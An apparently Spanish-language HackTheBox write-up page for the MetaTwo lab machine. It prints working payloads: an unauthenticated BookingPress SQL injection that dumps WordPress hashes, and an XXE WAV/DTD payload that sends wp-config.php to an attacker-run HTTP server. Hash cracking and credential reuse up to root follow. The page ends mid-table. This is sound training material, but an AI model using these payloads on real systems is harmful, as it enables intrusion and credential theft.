@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>MetaTwo — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina MetaTwo de HackTheBox (Linux, Fácil): una SQLi sin autenticar en el plugin BookingPress (CVE-2022-0739) saca el hash de manager; un XXE en la librería de medios de WordPress (CVE-2021-29447) lee wp-config.php, y de ahí FTP, SSH y passpie/GPG llevan a root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/facil/metatwo.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="MetaTwo — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina MetaTwo de HackTheBox (Linux, Fácil): una SQLi sin autenticar en el plugin BookingPress (CVE-2022-0739) saca el hash de manager; un XXE en la librería de medios de WordPress (CVE-2021-29447) lee wp-config.php, y de ahí FTP, SSH y passpie/GPG llevan a root.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/facil/metatwo.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/metatwo.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="MetaTwo — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina MetaTwo de HackTheBox (Linux, Fácil): una SQLi sin autenticar en el plugin BookingPress (CVE-2022-0739) saca el hash de manager; un XXE en la librería de medios de WordPress (CVE-2021-29447) lee wp-config.php, y de ahí FTP, SSH y passpie/GPG llevan a root.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/metatwo.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "MetaTwo — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina MetaTwo de HackTheBox (Linux, Fácil): una SQLi sin autenticar en el plugin BookingPress (CVE-2022-0739) saca el hash de manager; un XXE en la librería de medios de WordPress (CVE-2021-29447) lee wp-config.php, y de ahí FTP, SSH y passpie/GPG llevan a root.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/metatwo.html", "image": "https://brandeiks.github.io/assets/og/metatwo.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/facil/metatwo.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>metatwo</span>
+    </div>
+    <h1 class="writeup-title">META<span>TWO</span></h1>
+    <p class="writeup-subtitle">// SQLi BookingPress (CVE-2022-0739) → XXE (CVE-2021-29447) → FTP → SSH → passpie → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-cve">CVE-2022-0739</span>
+      <span class="meta-badge badge-sqli">SQLI</span>
+      <span class="meta-badge badge-cve">CVE-2021-29447 XXE</span>
+      <span class="meta-badge badge-creds">PASSPIE/GPG</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li><li><a href="#puertos">02 · Puertos</a></li><li><a href="#paso1">03 · Reconocimiento</a></li><li><a href="#paso2">04 · SQLi en BookingPress</a></li><li><a href="#paso3">05 · Crackear manager y entrar al panel</a></li><li><a href="#paso4">06 · XXE en la librería de medios</a></li><li><a href="#paso5">07 · FTP → credenciales SMTP → SSH jnelson</a></li><li><a href="#paso6">08 · Root con passpie</a></li><li><a href="#paso7">09 · Limpieza</a></li><li><a href="#datos">10 · Flags y credenciales</a></li><li><a href="#referencias">11 · Referencias</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">MetaTwo</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Debian 11 (WordPress 5.6.2)</span></div>
+      <div class="info-row"><span class="info-label">ENTRADA</span><span class="info-val val-yellow">SQLi BookingPress</span></div>
+      <div class="info-row"><span class="info-label">TÉCNICA</span><span class="info-val val-red">XXE + passpie (GPG)</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">ESTADO</span><span class="info-val val-green">● Retirada</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SQLi BookingPress → <span>manager</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">XXE → <span>wp-config.php</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">FTP → SMTP → SSH <span>jnelson</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">passpie/GPG → <span>root</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <main id="main" class="writeup-content">
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p><strong>Resumen.</strong> WordPress 5.6.2 con el plugin <strong>BookingPress &lt; 1.0.11</strong>, vulnerable a una <strong>SQLi sin autenticar</strong> en <code style="color:var(--yellow)">admin-ajax.php</code>. Con un UNION de 9 columnas se vuelcan los hashes de <code style="color:var(--yellow)">wp_users</code>; el de <code style="color:var(--yellow)">manager</code> cae con hashcat (<code style="color:var(--yellow)">partylikearockstar</code>). Ese usuario solo puede subir medios, lo que basta para <strong>CVE-2021-29447</strong> (XXE en la librería de medios de WP 5.6.2): subiendo un <code style="color:var(--yellow)">.wav</code> con XML malicioso se lee <code style="color:var(--yellow)">wp-config.php</code> y salen las credenciales del <strong>FTP</strong>. En el FTP está <code style="color:var(--yellow)">mailer/send_email.php</code> con la contraseña SMTP de <code style="color:var(--yellow)">jnelson</code>, que sirve para <strong>SSH</strong> (user flag). En su home hay una base de <strong>passpie</strong> cifrada con GPG: se crackea la passphrase (<code style="color:var(--yellow)">blink182</code>) y se obtiene la contraseña de <strong>root</strong>.</p></div>
+      <div class="info-box"><p class="info-box-title">// NOTA</p><p><strong>Versión simplificada (la usada):</strong> SQLi a mano (una sola petición), el XXE con dos ficheros, y <code style="color:var(--yellow)">gpg2john</code> + <code style="color:var(--yellow)">john</code> + <code style="color:var(--yellow)">passpie copy</code>. Nada de sqlmap ni de fuerza bruta larga.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="puertos">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Puertos</h2>
+      <div class="section-line"></div>
+      <table class="vuln-table"><thead><tr><th>Puerto</th><th>Servicio</th></tr></thead><tbody>
+      <tr><td>21/tcp</td><td>FTP (ProFTPD Debian) — sin acceso anónimo</td></tr>
+      <tr><td>22/tcp</td><td>SSH (OpenSSH 8.4p1)</td></tr>
+      <tr><td>80/tcp</td><td>nginx 1.18.0 → WordPress (<code style="color:var(--yellow)">metapress.htb</code>)</td></tr>
+      </tbody></table>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso1">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.228.95
+sudo nmap -sV -Pn -p21,22,80 10.129.228.95
+echo &quot;10.129.228.95 metapress.htb&quot; | sudo tee -a /etc/hosts
+curl -s http://metapress.htb/ | grep -ioE &#x27;WordPress [0-9.]+|bookingpress[^&quot; ]*&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.228.95</span></div><div><span class="prompt">$ </span><span class="cmd">sudo nmap -sV -Pn -p21,22,80 10.129.228.95</span></div><div><span class="prompt">$ </span><span class="cmd">echo &quot;10.129.228.95 metapress.htb&quot; | sudo tee -a /etc/hosts</span></div><div><span class="prompt">$ </span><span class="cmd">curl -s http://metapress.htb/ | grep -ioE &#x27;WordPress [0-9.]+|bookingpress[^&quot; ]*&#x27;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> 21, 22 y 80. La web es <strong>WordPress 5.6.2</strong> con el plugin <code style="color:var(--yellow)">bookingpress-appointment-booking</code> y una página <code style="color:var(--yellow)">/events/</code> con el formulario de reservas.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso2">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">SQLi en BookingPress</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="# el nonce está en el HTML de /events/
+curl -s http://metapress.htb/events/ | grep -oE &quot;nonce:&#x27;[a-f0-9]+&#x27;&quot; | head -1
+# nonce:&#x27;56fb54bac2&#x27;   y   category_id:1"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="comment"># el nonce está en el HTML de /events/</span></div><div><span class="prompt">$ </span><span class="cmd">curl -s http://metapress.htb/events/ | grep -oE &quot;nonce:&#x27;[a-f0-9]+&#x27;&quot; | head -1</span></div><div><span class="comment"># nonce:&#x27;56fb54bac2&#x27;   y   category_id:1</span></div></div>
+      <div class="cmd-block" data-cmd="curl -s http://metapress.htb/wp-admin/admin-ajax.php \
+  --data-urlencode &quot;action=bookingpress_front_get_category_services&quot; \
+  --data-urlencode &quot;_wpnonce=56fb54bac2&quot; \
+  --data-urlencode &quot;category_id=1&quot; \
+  --data-urlencode &quot;total_service=-1) UNION ALL SELECT 1,GROUP_CONCAT(user_login,0x3a,user_pass),3,4,5,6,7,8,9 FROM wp_users-- -&quot;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">curl -s http://metapress.htb/wp-admin/admin-ajax.php \</span></div><div><span class="prompt">$ </span><span class="cmd">  --data-urlencode &quot;action=bookingpress_front_get_category_services&quot; \</span></div><div><span class="prompt">$ </span><span class="cmd">  --data-urlencode &quot;_wpnonce=56fb54bac2&quot; \</span></div><div><span class="prompt">$ </span><span class="cmd">  --data-urlencode &quot;category_id=1&quot; \</span></div><div><span class="prompt">$ </span><span class="cmd">  --data-urlencode &quot;total_service=-1) UNION ALL SELECT 1,GROUP_CONCAT(user_login,0x3a,user_pass),3,4,5,6,7,8,9 FROM wp_users-- -&quot;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong></p></div>
+      <div class="output-block"><div>admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</div><div>manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70</div></div>
+      <div class="prose"><p><strong>Por qué funciona:</strong> el parámetro <code style="color:var(--yellow)">total_service</code> se concatena en una consulta sin parametrizar; la tabla tiene 9 columnas y el resultado se devuelve en JSON (columna 2 visible). El *nonce* no caduca entre peticiones.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso3">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Crackear manager y entrar al panel</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="echo &#x27;manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27; &gt; wp.hash
+hashcat -m 400 -a 0 wp.hash /usr/share/wordlists/rockyou.txt --user
+# $P$B4aNM28N0E...:partylikearockstar"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">echo &#x27;manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27; &gt; wp.hash</span></div><div><span class="prompt">$ </span><span class="cmd">hashcat -m 400 -a 0 wp.hash /usr/share/wordlists/rockyou.txt --user</span></div><div><span class="comment"># $P$B4aNM28N0E...:partylikearockstar</span></div></div>
+      <div class="prose"><p>Con <code style="color:var(--yellow)">manager</code> / <code style="color:var(--yellow)">partylikearockstar</code> se entra a <code style="color:var(--yellow)">/wp-admin</code> (solo puede gestionar medios, pero es justo lo necesario).</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso4">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">XXE en la librería de medios</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="# 1) DTD que lee wp-config.php y lo exfiltra en base64
+cat &gt; evil.dtd &lt;&lt;&#x27;EOF&#x27;
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=../wp-config.php&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://10.10.16.12:8000/?p=%file;&#x27;&gt;&quot; &gt;
+EOF
+# 2) WAV con iXML malicioso
+printf &#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY %% remote SYSTEM &#x27;&quot;&#x27;&quot;&#x27;http://10.10.16.12:8000/evil.dtd&#x27;&quot;&#x27;&quot;&#x27;&gt;%%remote;%%init;%%trick;]&gt;\x00&#x27; &gt; payload.wav
+# 3) servicio que registra la exfiltración y subida del WAV
+python3 -m http.server 8000 --bind 10.10.16.12 &amp;
+curl -s -b /tmp/wp.jar -F &quot;async-upload=@payload.wav;type=audio/wav&quot; -F &quot;name=payload.wav&quot; \
+  -F &quot;action=upload-attachment&quot; -F &quot;_wpnonce=868842a8c8&quot; \
+  http://metapress.htb/wp-admin/async-upload.php
+grep -oE &#x27;GET /\?p=[A-Za-z0-9+/=]+&#x27; /tmp/xxe.log | head -1 | sed &#x27;s|GET /?p=||&#x27; | base64 -d"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="comment"># 1) DTD que lee wp-config.php y lo exfiltra en base64</span></div><div><span class="prompt">$ </span><span class="cmd">cat &gt; evil.dtd &lt;&lt;&#x27;EOF&#x27;</span></div><div><span class="prompt">$ </span><span class="cmd">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=../wp-config.php&quot;&gt;</span></div><div><span class="prompt">$ </span><span class="cmd">&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://10.10.16.12:8000/?p=%file;&#x27;&gt;&quot; &gt;</span></div><div><span class="prompt">$ </span><span class="cmd">EOF</span></div><div>&nbsp;</div><div><span class="comment"># 2) WAV con iXML malicioso</span></div><div><span class="prompt">$ </span><span class="cmd">printf &#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY %% remote SYSTEM &#x27;&quot;&#x27;&quot;&#x27;http://10.10.16.12:8000/evil.dtd&#x27;&quot;&#x27;&quot;&#x27;&gt;%%remote;%%init;%%trick;]&gt;\x00&#x27; &gt; payload.wav</span></div><div>&nbsp;</div><div><span class="comment"># 3) servicio que registra la exfiltración y subida del WAV</span></div><div><span class="prompt">$ </span><span class="cmd">python3 -m http.server 8000 --bind 10.10.16.12 &amp;</span></div><div><span class="prompt">$ </span><span class="cmd">curl -s -b /tmp/wp.jar -F &quot;async-upload=@payload.wav;type=audio/wav&quot; -F &quot;name=payload.wav&quot; \</span></div><div><span class="prompt">$ </span><span class="cmd">  -F &quot;action=upload-attachment&quot; -F &quot;_wpnonce=868842a8c8&quot; \</span></div><div><span class="prompt">$ </span><span class="cmd">  http://metapress.htb/wp-admin/async-upload.php</span></div><div><span class="prompt">$ </span><span class="cmd">grep -oE &#x27;GET /\?p=[A-Za-z0-9+/=]+&#x27; /tmp/xxe.log | head -1 | sed &#x27;s|GET /?p=||&#x27; | base64 -d</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong></p></div>
+      <div class="output-block"><div>define( &#x27;FTP_USER&#x27;, &#x27;metapress.htb&#x27; );</div><div>define( &#x27;FTP_PASS&#x27;, &#x27;9NYS_ii@FyL_p5M2NvJ&#x27; );</div><div>define( &#x27;FTP_HOST&#x27;, &#x27;ftp.metapress.htb&#x27; );</div></div>
+      <div class="prose"><p><strong>Trampa:</strong> el <code style="color:var(--yellow)">POST</code> de subida devuelve <strong>502 de nginx</strong>, pero el XML se procesó igual (la petición XXE sale). No hay que fiarse del código de respuesta.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso5">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">FTP → credenciales SMTP → SSH jnelson</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="lftp -u &#x27;metapress.htb&#x27;,&#x27;9NYS_ii@FyL_p5M2NvJ&#x27; -e &quot;cd mailer; get send_email.php -o /tmp/send_email.php; bye&quot; ftp://metapress.htb
+grep -E &#x27;Username|Password&#x27; /tmp/send_email.php
+# $mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;
+# $mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">lftp -u &#x27;metapress.htb&#x27;,&#x27;9NYS_ii@FyL_p5M2NvJ&#x27; -e &quot;cd mailer; get send_email.php -o /tmp/send_email.php; bye&quot; ftp://metapress.htb</span></div><div><span class="prompt">$ </span><span class="cmd">grep -E &#x27;Username|Password&#x27; /tmp/send_email.php</span></div><div><span class="comment"># $mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;</span></div><div><span class="comment"># $mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;</span></div></div>
+      <div class="cmd-block" data-cmd="sshpass -p &#x27;Cb4_JmWM8zUZWMu@Ys&#x27; ssh jnelson@metapress.htb &#x27;cat ~/user.txt&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sshpass -p &#x27;Cb4_JmWM8zUZWMu@Ys&#x27; ssh jnelson@metapress.htb &#x27;cat ~/user.txt&#x27;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> user flag <strong><code style="color:var(--yellow)">[flag oculta]</code></strong>.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso6">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Root con passpie</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="scp jnelson@metapress.htb:~/.passpie/.keys keys
+# quedarse SOLO con el bloque privado
+python3 - &lt;&lt;&#x27;PY&#x27;
+import re
+t = open(&#x27;keys&#x27;).read()
+m = re.search(r&#x27;-----BEGIN PGP PRIVATE KEY BLOCK-----.*?-----END PGP PRIVATE KEY BLOCK-----&#x27;, t, re.S)
+open(&#x27;keys_priv&#x27;,&#x27;w&#x27;).write(m.group(0) + &#x27;\n&#x27;)
+PY
+gpg2john keys_priv &gt; gpg.hash
+john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# blink182  (Passpie)"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">scp jnelson@metapress.htb:~/.passpie/.keys keys</span></div><div><span class="comment"># quedarse SOLO con el bloque privado</span></div><div><span class="prompt">$ </span><span class="cmd">python3 - &lt;&lt;&#x27;PY&#x27;</span></div><div><span class="prompt">$ </span><span class="cmd">import re</span></div><div><span class="prompt">$ </span><span class="cmd">t = open(&#x27;keys&#x27;).read()</span></div><div><span class="prompt">$ </span><span class="cmd">m = re.search(r&#x27;-----BEGIN PGP PRIVATE KEY BLOCK-----.*?-----END PGP PRIVATE KEY BLOCK-----&#x27;, t, re.S)</span></div><div><span class="prompt">$ </span><span class="cmd">open(&#x27;keys_priv&#x27;,&#x27;w&#x27;).write(m.group(0) + &#x27;\n&#x27;)</span></div><div><span class="prompt">$ </span><span class="cmd">PY</span></div><div><span class="prompt">$ </span><span class="cmd">gpg2john keys_priv &gt; gpg.hash</span></div><div><span class="prompt">$ </span><span class="cmd">john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt</span></div><div><span class="comment"># blink182  (Passpie)</span></div></div>
+      <div class="cmd-block" data-cmd="passpie copy --to stdout --passphrase blink182 root@ssh
+# p7qfAZt4_A1xo_0x
+(sleep 1; echo &#x27;p7qfAZt4_A1xo_0x&#x27;) | script -qec &quot;su - -c &#x27;id; cat /root/root.txt&#x27;&quot; /dev/null"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">passpie copy --to stdout --passphrase blink182 root@ssh</span></div><div><span class="comment"># p7qfAZt4_A1xo_0x</span></div><div><span class="prompt">$ </span><span class="cmd">(sleep 1; echo &#x27;p7qfAZt4_A1xo_0x&#x27;) | script -qec &quot;su - -c &#x27;id; cat /root/root.txt&#x27;&quot; /dev/null</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <code style="color:var(--yellow)">uid=0(root)</code> y la root flag <strong><code style="color:var(--yellow)">[flag oculta]</code></strong>.</p></div>
+      <div class="prose"><p><strong>Por qué funciona:</strong> passpie cifra cada contraseña con la clave GPG del usuario. Si la passphrase de esa clave es débil, se crackea con <code style="color:var(--yellow)">gpg2john</code> y se descifra la base de datos entera (que incluye la contraseña de root).</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso7">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Limpieza</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="# el upload quedó en /var/www/metapress.htb/blog/wp-content/uploads/2026/10 (FTP no puede borrarlo)
+su - -c &#x27;rm -rf /var/www/metapress.htb/blog/wp-content/uploads/2026&#x27;
+pkill -f &#x27;http.server 8000&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="comment"># el upload quedó en /var/www/metapress.htb/blog/wp-content/uploads/2026/10 (FTP no puede borrarlo)</span></div><div><span class="prompt">$ </span><span class="cmd">su - -c &#x27;rm -rf /var/www/metapress.htb/blog/wp-content/uploads/2026&#x27;</span></div><div><span class="prompt">$ </span><span class="cmd">pkill -f &#x27;http.server 8000&#x27;</span></div></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="datos">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Flags y credenciales</h2>
+      <div class="section-line"></div>
+      <table class="vuln-table"><thead><tr><th>Flag</th><th>Valor</th><th>Dónde</th></tr></thead><tbody>
+      <tr><td>user.txt</td><td><code style="color:var(--yellow)">[flag oculta]</code></td><td><code style="color:var(--yellow)">/home/jnelson/user.txt</code></td></tr>
+      <tr><td>root.txt</td><td><code style="color:var(--yellow)">[flag oculta]</code></td><td><code style="color:var(--yellow)">/root/root.txt</code></td></tr>
+      </tbody></table>
+      <div class="prose"><p><strong>Credenciales encontradas</strong></p></div>
+      <table class="vuln-table"><thead><tr><th>Cuenta</th><th>Credencial</th><th>Cómo</th></tr></thead><tbody>
+      <tr><td>WP <code style="color:var(--yellow)">manager</code></td><td><code style="color:var(--yellow)">partylikearockstar</code></td><td>hash phpass de <code style="color:var(--yellow)">wp_users</code> (SQLi)</td></tr>
